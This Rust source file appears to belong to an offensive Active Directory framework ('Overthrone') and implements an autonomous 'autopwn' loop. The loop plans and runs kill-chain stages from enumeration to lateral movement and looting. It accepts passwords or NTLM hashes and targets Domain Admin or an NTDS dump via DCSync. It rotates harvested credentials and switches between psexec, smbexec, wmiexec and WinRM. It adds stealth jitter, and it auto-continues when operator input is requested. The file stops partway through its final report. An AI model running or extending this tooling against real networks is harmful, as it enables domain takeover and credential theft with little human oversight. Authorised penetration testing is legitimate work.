//! Top-level runner â€” The main autopwn loop that ties together
//! goals, planner, executor, and adaptive engine into a cohesive
//! autonomous attack workflow.
//!
//! Flow:
//!   1. Parse config â†’ set goal
//!   2. Planner builds initial attack plan
//!   3. Loop over plan steps:
//!      a. Executor runs the step
//!      b. Adaptive engine evaluates result
//!      c. Decision: continue / retry / skip / re-plan / abort
//!   4. Check if goal is achieved after each step
//!   5. If blocked, adaptive re-plans with updated state
//!   6. Return final result with full audit trail

use crate::adaptive::{AdaptiveDecision, AdaptiveEngine, AdaptiveSummary, StepModification};
use crate::executor::{self, ExecContext};
use crate::goals::{AttackGoal, EngagementState, GoalStatus};
use crate::planner::{PlanStep, PlannedAction, Planner};
use crate::playbook::{Playbook, PlaybookId};
use crate::trail::TrailWriter;
use chrono::{DateTime, Utc};
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Instant;
use tracing::{info, warn};

#[cfg(feature = "qlearn")]
use crate::qlearner::{AdaptiveMode, AdaptiveQLearner, EngagementStateKey, decision_to_action};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Credentials
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Holds domain credentials for the pilot runner.
/// Private `secret` field is intentional â€” use `CredentialSnapshot` for serde.
#[derive(Debug, Clone)]
pub struct Credentials {
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    secret: String,
    is_hash: bool,
}

impl Credentials {
    /// Runs this module operation.
    pub fn password(domain: &str, username: &str, password: &str) -> Self {
        Self {
            domain: domain.to_string(),
            username: username.to_string(),
            secret: password.to_string(),
            is_hash: false,
        }
    }
    /// Function
    pub fn ntlm_hash(domain: &str, username: &str, hash: &str) -> Self {
        Self {
            domain: domain.to_string(),
            username: username.to_string(),
            secret: hash.to_string(),
            is_hash: true,
        }
    }

    pub fn secret(&self) -> &str {
        &self.secret
    }

    pub fn is_hash(&self) -> bool {
        self.is_hash
    }

    /// Convert to serializable snapshot (for checkpoint save)
    pub fn to_snapshot(&self) -> CredentialSnapshot {
        CredentialSnapshot {
            domain: self.domain.clone(),
            username: self.username.clone(),
            secret: self.secret.clone(),
            is_hash: self.is_hash,
        }
    }

    /// Restore from snapshot (for checkpoint load)
    pub fn from_snapshot(snap: CredentialSnapshot) -> Self {
        Self {
            domain: snap.domain,
            username: snap.username,
            secret: snap.secret,
            is_hash: snap.is_hash,
        }
    }
}

/// Serializable credential snapshot used in checkpoints.
/// Stores all fields plaintext â€” only write to disk in a secure context.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialSnapshot {
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    /// Secret value
    pub secret: String,
    /// Hash value
    pub is_hash: bool,
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Stages (ordered attack phases)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Ordered attack stages
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Stage {
    /// `` variant
    Enumerate = 0,
    /// `` variant
    Attack = 1,
    /// `` variant
    Escalate = 2,
    /// `` variant
    Lateral = 3,
    /// `` variant
    Loot = 4,
    /// `` variant
    Cleanup = 5,
}

impl std::fmt::Display for Stage {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Enumerate => write!(f, "ENUM"),
            Self::Attack => write!(f, "ATTACK"),
            Self::Escalate => write!(f, "ESCALATE"),
            Self::Lateral => write!(f, "LATERAL"),
            Self::Loot => write!(f, "LOOT"),
            Self::Cleanup => write!(f, "CLEANUP"),
        }
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Exec Method
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Remote execution method preference
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExecMethod {
    /// `Auto` variant
    Auto,
    /// `PsExec` variant
    PsExec,
    /// `SmbExec` variant
    SmbExec,
    /// `WmiExec` variant
    WmiExec,
    /// `WinRm` variant
    WinRm,
}

impl std::fmt::Display for ExecMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Auto => write!(f, "auto"),
            Self::PsExec => write!(f, "psexec"),
            Self::SmbExec => write!(f, "smbexec"),
            Self::WmiExec => write!(f, "wmiexec"),
            Self::WinRm => write!(f, "winrm"),
        }
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AutoPwn Configuration
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Serializable config used by WizardSession checkpointing.
/// Mirrors AutoPwnConfig but uses CredentialSnapshot for serde.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutoPwnConfigSnapshot {
    /// dc host field
    pub dc_host: String,
    /// creds field
    pub creds: CredentialSnapshot,
    /// Target domain FQDN
    pub target: String,
    /// max stage field
    pub max_stage: Stage,
    /// stealth field
    pub stealth: bool,
    /// dry run field
    pub dry_run: bool,
    /// exec method field
    pub exec_method: ExecMethod,
    /// jitter ms field
    pub jitter_ms: u64,
    /// use ldaps field
    pub use_ldaps: bool,
    /// Timeout in seconds
    pub timeout: u64,
}

/// Configuration for the autonomous attack runner
#[derive(Debug, Clone)]
pub struct AutoPwnConfig {
    /// Domain controller IP/hostname
    pub dc_host: String,
    /// Credentials to start with
    pub creds: Credentials,
    /// High-level target (e.g., "Domain Admins")
    pub target: String,
    /// Maximum stage to reach
    pub max_stage: Stage,
    /// Stealth mode â€” prefer low-noise methods
    pub stealth: bool,
    /// Dry run â€” plan only, don't execute
    pub dry_run: bool,
    /// Preferred execution method
    pub exec_method: ExecMethod,
    /// Jitter between steps (milliseconds)
    pub jitter_ms: u64,
    /// Use LDAPS
    pub use_ldaps: bool,
    /// Operation timeout per step (seconds)
    pub timeout: u64,
    /// Adaptive engine mode (only used with `qlearn` feature)
    #[cfg(feature = "qlearn")]
    pub adaptive_mode: AdaptiveMode,
    /// Path for Q-table persistence (only used with `qlearn` feature)
    #[cfg(feature = "qlearn")]
    pub q_table_path: std::path::PathBuf,
    /// Pre-loaded engagement state (for session resume)
    pub initial_state: Option<crate::goals::EngagementState>,
}

impl AutoPwnConfig {
    /// Derive the attack goal from the target string
    pub fn goal(&self) -> AttackGoal {
        let lower = self.target.to_lowercase();

        if lower == "domain admins" || lower == "da" || lower == "enterprise admins" {
            AttackGoal::DomainAdmin {
                target_group: self.target.clone(),
            }
        } else if lower == "ntds" || lower == "ntds.dit" || lower == "dcsync" {
            AttackGoal::DumpNtds { target_dc: None }
        } else if lower == "recon" || lower == "enum" || lower == "enumerate" {
            AttackGoal::ReconOnly
        } else if lower.contains('.') || lower.contains('$') {
            AttackGoal::CompromiseHost {
                target_host: self.target.clone(),
            }
        } else if lower.contains('\\') || lower.contains('@') {
            AttackGoal::CompromiseUser {
                target_user: self.target.clone(),
            }
        } else {
            AttackGoal::DomainAdmin {
                target_group: self.target.clone(),
            }
        }
    }

    /// Build executor context from this config
    pub fn exec_context(&self) -> ExecContext {
        ExecContext {
            dc_ip: self.dc_host.clone(),
            domain: self.creds.domain.clone(),
            username: self.creds.username.clone(),
            secret: self.creds.secret().to_string(),
            use_hash: self.creds.is_hash(),
            use_ldaps: self.use_ldaps,
            timeout: self.timeout,
            jitter_ms: if self.stealth {
                2000.max(self.jitter_ms)
            } else {
                self.jitter_ms
            },
            dry_run: self.dry_run,
            override_creds: None,
            ldap_available: true,
            preferred_method: format!("{:?}", self.exec_method).to_lowercase(),
        }
    }

    /// Convert to serializable snapshot (for checkpointing)
    pub fn to_snapshot(&self) -> AutoPwnConfigSnapshot {
        AutoPwnConfigSnapshot {
            dc_host: self.dc_host.clone(),
            creds: self.creds.to_snapshot(),
            target: self.target.clone(),
            max_stage: self.max_stage,
            stealth: self.stealth,
            dry_run: self.dry_run,
            exec_method: self.exec_method,
            jitter_ms: self.jitter_ms,
            use_ldaps: self.use_ldaps,
            timeout: self.timeout,
        }
    }

    /// Restore from snapshot (for checkpoint load)
    pub fn from_snapshot(snap: AutoPwnConfigSnapshot) -> Self {
        Self {
            dc_host: snap.dc_host,
            creds: Credentials::from_snapshot(snap.creds),
            target: snap.target,
            max_stage: snap.max_stage,
            stealth: snap.stealth,
            dry_run: snap.dry_run,
            exec_method: snap.exec_method,
            jitter_ms: snap.jitter_ms,
            use_ldaps: snap.use_ldaps,
            timeout: snap.timeout,
            #[cfg(feature = "qlearn")]
            adaptive_mode: AdaptiveMode::default(),
            #[cfg(feature = "qlearn")]
            q_table_path: std::path::PathBuf::from("q_table.json"),
            initial_state: None,
        }
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AutoPwn Result
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Final result of the autonomous attack run
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutoPwnResult {
    /// Domain FQDN
    pub domain_admin_achieved: bool,
    /// goal status field
    pub goal_status: GoalStatus,
    /// state field
    pub state: EngagementState,
    /// adaptive summary field
    pub adaptive_summary: AdaptiveSummary,
    /// duration secs field
    pub duration_secs: u64,
    /// started at field
    pub started_at: DateTime<Utc>,
    /// finished at field
    pub finished_at: DateTime<Utc>,
    /// steps executed field
    pub steps_executed: usize,
    /// steps succeeded field
    pub steps_succeeded: usize,
    /// steps failed field
    pub steps_failed: usize,
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Main Runner
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Run the autonomous attack chain
pub async fn run(config: AutoPwnConfig) -> AutoPwnResult {
    let started_at = Utc::now();
    let wall_start = Instant::now();

    println!(
        "\n{}",
        "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
            .bold()
            .red()
    );
    println!(
        "{}",
        "â•‘          OVERTHRONE â€” PILOT AUTOPWN          â•‘"
            .bold()
            .red()
    );
    println!(
        "{}",
        "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
            .bold()
            .red()
    );

    let goal = config.goal();
    println!(
        "  {} Goal: {}",
        "TARGET".bold().red(),
        goal.describe().bold()
    );
    println!(
        "  {} DC: {} | Domain: {} | User: {} | Stealth: {} | Dry: {}",
        "CONFIG".bold().blue(),
        config.dc_host.bold(),
        config.creds.domain.bold(),
        config.creds.username.bold(),
        if config.stealth {
            "ON".green()
        } else {
            "OFF".yellow()
        },
        if config.dry_run {
            "YES".yellow()
        } else {
            "NO".dimmed()
        }
    );
    println!();

    let mut state = if let Some(initial) = config.initial_state.clone() {
        println!(
            "  {} Resuming from saved session state",
            colored::Colorize::cyan("â–º")
        );
        initial
    } else {
        EngagementState::new()
    };
    state.domain = state.domain.or_else(|| Some(config.creds.domain.clone()));
    state.dc_ip = state.dc_ip.or_else(|| Some(config.dc_host.clone()));
    let trail = match TrailWriter::start(
        "Auto-pwn",
        &config.creds.domain,
        &config.dc_host,
        &goal.describe(),
        config.initial_state.is_some(),
    ) {
        Ok(writer) => {
            println!(
                "  {} Trail file: {}",
                "TRAIL".bold().cyan(),
                writer.path().display()
            );
            Some(writer)
        }
        Err(e) => {
            warn!("trail file initialization failed: {e}");
            None
        }
    };

    let planner = Planner::new(config.stealth);
    let mut adaptive = AdaptiveEngine::new(config.stealth);
    let mut ctx = config.exec_context();

    // â”€â”€ Q-Learning Engine (optional) â”€â”€
    #[cfg(feature = "qlearn")]
    let mut qlearner: Option<AdaptiveQLearner> = match config.adaptive_mode {
        AdaptiveMode::QLearning | AdaptiveMode::Hybrid => {
            let ql = AdaptiveQLearner::load(config.stealth, config.q_table_path.clone());
            println!(
                "  {} Q-learner loaded (mode={:?}, states={}, Îµ={:.3})",
                "QL".bold().magenta(),
                config.adaptive_mode,
                ql.q_table_size(),
                ql.epsilon()
            );
            Some(ql)
        }
        AdaptiveMode::Heuristic => None,
    };

    // â”€â”€ LDAP Pre-flight Check â”€â”€
    // Try LDAP bind to verify connectivity before starting the attack chain.
    // If it fails, mark LDAP as unavailable to skip LDAP-dependent steps
    // instead of failing each one identically.
    if !config.dry_run {
        println!(
            "  {} Pre-flight LDAP connectivity check...",
            "PRE".bold().cyan()
        );
        if ctx.use_hash {
            match overthrone_core::proto::ldap::LdapSession::connect_with_hash(
                &ctx.dc_ip,
                &ctx.domain,
                &ctx.username,
                &ctx.secret,
                ctx.use_ldaps,
            )
            .await
            {
                Ok(mut session) => {
                    println!(
                        "  {} LDAP NTLM bind OK ({})",
                        "âœ“".green().bold(),
                        session.bind_type
                    );
                    let _ = session.disconnect().await;
                }
                Err(e) => {
                    println!(
                        "  {} LDAP pre-flight failed (hash mode): {}",
                        "âœ—".red().bold(),
                        e
                    );
                    println!(
                        "  {} LDAP-dependent enumeration steps will be skipped. \
                     Kerberos and SMB operations will still be attempted.",
                        "!".yellow().bold()
                    );
                    ctx.ldap_available = false;
                }
            }
        } else {
            match overthrone_core::proto::ldap::LdapSession::connect(
                &ctx.dc_ip,
                &ctx.domain,
                &ctx.username,
                &ctx.secret,
                ctx.use_ldaps,
            )
            .await
            {
                Ok(mut session) => {
                    println!(
                        "  {} LDAP bind OK ({})",
                        "âœ“".green().bold(),
                        session.bind_type
                    );
                    let _ = session.disconnect().await;
                }
                Err(e) => {
                    println!("  {} LDAP pre-flight failed: {}", "âœ—".red().bold(), e);
                    println!(
                        "  {} LDAP-dependent enumeration steps will be skipped. \
                     Kerberos and SMB operations will still be attempted.",
                        "!".yellow().bold()
                    );
                    ctx.ldap_available = false;
                }
            }
        }
    }

    let mut steps_executed = 0usize;
    let mut steps_succeeded = 0usize;
    let mut steps_failed = 0usize;
    let mut successful_steps: Vec<PlanStep> = Vec::new();

    // â”€â”€ Per-stage tracking â”€â”€
    let mut stage_stats: HashMap<Stage, (usize, usize)> = HashMap::new(); // (succeeded, failed)
    let mut current_stage: Option<Stage> = None;

    let mut plan = planner.plan(&goal, &state, adaptive.failed_actions(), ctx.ldap_available);
    let total_planned = plan.steps.len();

    // Print kill-chain pipeline header
    print_kill_chain_pipeline(None, &stage_stats);

    'main: loop {
        adaptive.adjust_plan(&mut plan, &state);

        let step_idx = match plan.steps.iter().position(|s| !s.executed) {
            Some(idx) => idx,
            None => {
                println!("\n  {} All planned steps executed", "âœ“".green().bold());
                break 'main;
            }
        };

        let step = &plan.steps[step_idx];
        if step.stage > config.max_stage {
            println!(
                "\n  {} Stage {} exceeds max ({}), stopping",
                "âŠ˜".dimmed(),
                step.stage,
                config.max_stage
            );
            break 'main;
        }

        // â”€â”€ OPSEC gate: skip steps that exceed the noise budget â”€â”€
        {
            let max_allowed = if config.stealth {
                crate::planner::NoiseLevel::Medium
            } else {
                crate::planner::NoiseLevel::Critical
            };
            let (step_noise, step_desc) = {
                let s = &plan.steps[step_idx];
                (s.noise, s.description.clone())
            };
            if step_noise > max_allowed {
                warn!(
                    "  OPSEC: skipping '{}' (noise={} > max={})",
                    step_desc, step_noise, max_allowed
                );
                plan.steps[step_idx].executed = true;
                plan.steps[step_idx].result = Some(crate::planner::StepResult {
                    success: false,
                    output: format!(
                        "Skipped: noise level {} exceeds OPSEC budget ({})",
                        step_noise, max_allowed
                    ),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                });
                steps_failed += 1;
                continue 'main;
            }
        }

        // â”€â”€ Stage transition: print banner when entering a new stage â”€â”€
        if current_stage != Some(step.stage) {
            if current_stage.is_some() {
                print_kill_chain_pipeline(current_stage, &stage_stats);
            }
            let steps_in_stage = plan
                .steps
                .iter()
                .filter(|s| s.stage == step.stage && !s.executed)
                .count();
            let noise_in_stage = plan
                .steps
                .iter()
                .filter(|s| s.stage == step.stage)
                .map(|s| s.noise)
                .max()
                .unwrap_or(crate::planner::NoiseLevel::Silent);
            print_stage_banner(step.stage, steps_in_stage, noise_in_stage);
            if let Some(writer) = &trail {
                writer.append_stage(step.stage, steps_in_stage);
            }
            current_stage = Some(step.stage);
        }

        // â”€â”€ Step pre-announcement â”€â”€
        println!(
            "\n  {} [{}/{}] [{}] {}  {}{}",
            "â”Œâ”€".dimmed(),
            steps_executed + 1,
            total_planned,
            step.stage.to_string().bold(),
            step.description.bold(),
            format!("â—{}", step.noise).dimmed(),
            format!("  prio:{}", step.priority).dimmed(),
        );

        // â”€â”€ Execute â”€â”€
        let step_stage = step.stage;
        let result = executor::execute_step(step, &ctx, &mut state).await;
        // `step` borrow is no longer needed â€” use `step_stage` / direct index below.
        steps_executed += 1;

        plan.steps[step_idx].executed = true;
        plan.steps[step_idx].result = Some(result.clone());

        if result.success {
            steps_succeeded += 1;
            stage_stats.entry(step_stage).or_insert((0, 0)).0 += 1;
            successful_steps.push(plan.steps[step_idx].clone());
        } else {
            steps_failed += 1;
            stage_stats.entry(step_stage).or_insert((0, 0)).1 += 1;
        }

        // â”€â”€ Step result display â”€â”€
        if let Some(writer) = &trail {
            writer.append_step(&plan.steps[step_idx], &result, &state);
        }

        if result.success {
            let output_display = truncate_output(&result.output, 120);
            let extras = if result.new_credentials > 0 || result.new_admin_hosts > 0 {
                format!(
                    "  [{}{}]",
                    if result.new_credentials > 0 {
                        format!("+{} creds", result.new_credentials)
                    } else {
                        String::new()
                    },
                    if result.new_admin_hosts > 0 {
                        format!(
                            "{}+{} hosts",
                            if result.new_credentials > 0 { "  " } else { "" },
                            result.new_admin_hosts
                        )
                    } else {
                        String::new()
                    },
                )
            } else {
                String::new()
            };
            println!(
                "  {} {} {}{}",
                "â””â”€".dimmed(),
                "âœ“".green().bold(),
                output_display.green(),
                extras.yellow().bold(),
            );
        } else {
            let output_display = truncate_output(&result.output, 120);
            println!(
                "  {} {} {}",
                "â””â”€".dimmed(),
                "âœ—".red().bold(),
                output_display.red(),
            );
        }

        // â”€â”€ Encode state for Q-learning (before decision) â”€â”€
        #[cfg(feature = "qlearn")]
        let pre_state_key = qlearner.as_ref().map(|ql| {
            EngagementStateKey::encode(
                &state,
                &plan.steps[step_idx],
                &result,
                config.stealth,
                ql.consecutive_failures(),
            )
        });

        // â”€â”€ Q-state display (before decision) â”€â”€
        #[cfg(feature = "qlearn")]
        if let (Some(ql), Some(key)) = (&qlearner, &pre_state_key) {
            let state_snapshot = AdaptiveQLearner::format_state_snapshot(key, ql.epsilon());
            println!(
                "  {}  {} state={{{}}}",
                "â”‚".dimmed(),
                "[QL]".magenta().bold(),
                state_snapshot.dimmed(),
            );
            if let Some(writer) = &trail {
                writer.append_decision("QL state", state_snapshot);
            }
        }

        // â”€â”€ Decide next action â”€â”€
        #[cfg(feature = "qlearn")]
        let decision = if let Some(ref mut ql) = qlearner {
            ql.evaluate(&plan.steps[step_idx], &result, &state, &goal)
        } else {
            adaptive.evaluate(&plan.steps[step_idx], &result, &state, &goal)
        };
        #[cfg(not(feature = "qlearn"))]
        let decision = adaptive.evaluate(&plan.steps[step_idx], &result, &state, &goal);

        // â”€â”€ Q-learner decision display â”€â”€
        #[cfg(feature = "qlearn")]
        if let Some(ref ql) = qlearner
            && let Some((action, q_val, exploring)) = ql.last_decision_meta()
        {
            let decision_snapshot = AdaptiveQLearner::format_decision(action, *q_val, *exploring);
            println!(
                "  {}  {} â†’ {}",
                "â”‚".dimmed(),
                "[QL]".magenta().bold(),
                decision_snapshot.cyan(),
            );
            if let Some(writer) = &trail {
                writer.append_decision("QL decision", decision_snapshot);
            }
        }

        // â”€â”€ Record Q-learning outcome + display reward â”€â”€
        #[cfg(feature = "qlearn")]
        if let (Some(ql), Some(pre_key)) = (&mut qlearner, &pre_state_key) {
            let goal_achieved = state.evaluate_goal(&goal).is_success();
            let reward = AdaptiveQLearner::compute_reward(&result, goal_achieved, &decision);
            let action = decision_to_action(&decision);

            let post_key = EngagementStateKey::encode(
                &state,
                &plan.steps[step_idx],
                &result,
                config.stealth,
                ql.consecutive_failures(),
            );
            ql.record_outcome(pre_key, &action, reward, &post_key);
            let reward_snapshot =
                format!("reward={:+.1} table={} states", reward, ql.q_table_size());

            println!(
                "  {}  {} reward={:+.1}  table={} states",
                "â”‚".dimmed(),
                "[QL]".magenta().bold(),
                reward,
                ql.q_table_size(),
            );
            if let Some(writer) = &trail {
                writer.append_decision("QL reward", reward_snapshot);
            }
        }

        // â”€â”€ Handle decision â”€â”€
        if let Some(writer) = &trail {
            writer.append_decision("Decision", format!("{:?}", decision));
        }

        match decision {
            AdaptiveDecision::Continue => {
                let status = state.evaluate_goal(&goal);
                if status.is_success() {
                    println!(
                        "\n  ðŸŽ¯ {} {}",
                        "GOAL ACHIEVED:".green().bold(),
                        goal.describe().bold()
                    );
                    break 'main;
                }
            }

            AdaptiveDecision::Retry { delay_secs, modify } => {
                let mod_desc = match &modify {
                    Some(StepModification::SwapCredentials) => "swap credentials",
                    Some(StepModification::ExtendTimeout) => "extend timeout",
                    Some(StepModification::ReduceNoise) => "reduce noise",
                    Some(StepModification::AlternateMethod) => "alternate method",
                    None => "plain retry",
                };
                println!(
                    "  {} â†’ {} in {}s [{}]",
                    "â””â”€".dimmed(),
                    "RETRY".yellow().bold(),
                    delay_secs,
                    mod_desc.cyan(),
                );
                if let Some(modification) = modify {
                    match modification {
                        StepModification::SwapCredentials => {
                            if let Some((u, s, h)) =
                                crate::adaptive::rotate_credential(&state, &ctx.username)
                            {
                                println!("     ðŸ”‘ Swapping to: {}", u.bold());
                                ctx.override_creds = Some((u, s, h));
                            }
                        }
                        StepModification::ExtendTimeout => {
                            ctx.timeout = (ctx.timeout * 2).min(120);
                        }
                        StepModification::ReduceNoise => {
                            ctx.jitter_ms = (ctx.jitter_ms + 1000).min(10_000);
                        }
                        StepModification::AlternateMethod => {
                            let next = match ctx.preferred_method.as_str() {
                                "smbexec" => "wmiexec",
                                "wmiexec" => "winrmexec",
                                "winrmexec" => "psexec",
                                _ => "smbexec",
                            };
                            println!(
                                "     ðŸ”„ Switching exec method: {} â†’ {}",
                                ctx.preferred_method.bold(),
                                next.bold()
                            );
                            ctx.preferred_method = next.to_string();
                        }
                    }
                }
                tokio::time::sleep(tokio::time::Duration::from_secs(delay_secs)).await;
                plan.steps[step_idx].executed = false;
                plan.steps[step_idx].retries += 1;
                plan.steps[step_idx].result = None;
            }

            AdaptiveDecision::Skip { reason } => {
                println!(
                    "  {} â†’ {} {}",
                    "â””â”€".dimmed(),
                    "SKIP:".yellow(),
                    reason.dimmed(),
                );
            }

            AdaptiveDecision::Substitute { replacement } => {
                println!(
                    "  {} â†’ {} for: {}",
                    "â””â”€".dimmed(),
                    "SUBSTITUTE".cyan().bold(),
                    plan.steps[step_idx].description,
                );
                let new_step = PlanStep {
                    id: format!("{}_alt", plan.steps[step_idx].id),
                    description: format!("{} (alternative)", plan.steps[step_idx].description),
                    stage: plan.steps[step_idx].stage,
                    action: replacement,
                    priority: plan.steps[step_idx].priority - 1,
                    noise: plan.steps[step_idx].noise,
                    depends_on: vec![],
                    executed: false,
                    result: None,
                    retries: 0,
                    max_retries: plan.steps[step_idx].max_retries,
                    reversible: false,
                    compensation: None,
                };
                plan.steps.insert(step_idx + 1, new_step);
            }

            AdaptiveDecision::Replan { reason } => {
                println!(
                    "\n  {} â†’ {} {}",
                    "â””â”€".dimmed(),
                    "RE-PLAN:".blue().bold(),
                    reason,
                );
                if adaptive.replans_exhausted() {
                    println!(
                        "  {} Re-plan limit exhausted â€” aborting",
                        "âœ—".red().bold()
                    );
                    rollback_successful_steps(&successful_steps, &ctx, &mut state).await;
                    successful_steps.clear();
                    break 'main;
                }
                rollback_successful_steps(&successful_steps, &ctx, &mut state).await;
                successful_steps.clear();
                plan = planner.plan(&goal, &state, adaptive.failed_actions(), ctx.ldap_available);
            }

            AdaptiveDecision::Abort { reason } => {
                println!(
                    "\n  {} {} {}",
                    "â””â”€".dimmed(),
                    "ABORT:".red().bold(),
                    reason,
                );
                rollback_successful_steps(&successful_steps, &ctx, &mut state).await;
                successful_steps.clear();
                break 'main;
            }

            AdaptiveDecision::PauseForOperator { message } => {
                println!(
                    "\n  {} {} {}",
                    "â””â”€".dimmed(),
                    "OPERATOR NEEDED:".yellow().bold(),
                    message,
                );
                println!(
                    "  {} Auto-continuing (non-interactive mode)",
                    "â†’".dimmed()
                );
            }
        }

        if config.stealth && !config.dry_run {
            let jitter = rand::random::<u64>() % ctx.jitter_ms.max(500);
            tokio::time::sleep(tokio::time::Duration::from_millis(jitter)).await;
        }

        if steps_executed > 0 && steps_executed.is_multiple_of(10) {
            state.auto_save();
        }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // FINAL REPORT
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    let finished_at = Utc::now();
    let duration_secs = wall_start.elapsed().as_secs();

    // â”€â”€ Q-Learning: end episode & persist â”€â”€
    #[cfg(feature = "qlearn")]
    if let Some(ref mut ql) = qlearner {
        ql.end_episode();
        if let Err(e) = ql.save() {
            eprintln!("Q-learner: Failed to save Q-table: {e}");
        }
    }

    let final_status = state.evaluate_goal(&goal);
    let da_achieved = final_status.is_success()
        || state.has_domain_admin
        || matches!(final_status, GoalStatus::Achieved);
    let mut final_summary = format!(
        "Steps executed: `{}`. Succeeded: `{}`. Failed: `{}`. Duration: `{}` seconds. Final status: `{:?}`.",
        steps_executed, steps_succeeded, steps_failed, duration_secs, final_status
    );
    #[cfg(feature = "qlearn")]
    if let Some(ref ql) = qlearner {
        final_summary.push_str(&format!(" Q-learner: {}", ql.session_summary()));
    }
    if let Some(writer) = &trail {
        writer.append_final(&state, final_summary);
    }

    println!(
        "\n{}",
        "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "â•‘              PILOT â€” FINAL REPORT                       â•‘"
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
            .bold()
            .cyan()
    );

    // â”€â”€â”€ 1. Kill-chain completion visual â”€â”€â”€
    println!("\n  {}", "KILL CHAIN".bold().underline());
    print_kill_chain_pipeline(current_stage, &stage_stats);

    // â”€â”€â”€ 2. Per-stage stats table â”€â”€â”€
    println!("\n  {}", "STAGE BREAKDOWN".bold().underline());
    let all_stages = [
        Stage::Enumerate,
        Stage::Attack,
        Stage::Escalate,
        Stage::Lateral,
        Stage::Loot,
        Stage::Cleanup,
    ];
    println!(
        "  {:<12} {:>8} {:>10} {:>8}",
        "Stage".bold(),
        "Steps".bold(),
        "Succeeded".bold(),
        "Failed".bold()
    );
    println!("  {}", "â”€".repeat(42));
    for stage in &all_stages {
